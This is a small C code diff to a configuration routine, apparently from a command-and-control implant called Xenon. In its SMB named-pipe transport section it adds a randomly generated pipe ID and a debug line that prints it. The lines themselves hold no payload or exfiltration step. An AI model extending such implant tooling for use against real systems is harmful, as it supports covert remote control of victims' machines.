@@ -115,7 +115,9 @@ VOID XenonConfigure()
 
 #ifdef SMB_TRANSPORT
 
+    ULONG seed                     = GetTickCount();
     // Named Pipe Comms
+    xenonConfig->SmbId             = PseudoRandomIntegerSubroutine(&seed, 100000);
     xenonConfig->SmbPipe           = NULL;
     xenonConfig->SmbPipename       = ParserStringCopy(&ParserConfig, &namedPipeLen);                     // allocates
 
@@ -143,6 +145,7 @@ VOID XenonConfigure()
 
 #ifdef SMB_TRANSPORT
 
+    _dbg("[SmbId]          = %d", xenonConfig->SmbId);
     _dbg("[SmbPipename]    = %s", xenonConfig->SmbPipename);
     
 #endif
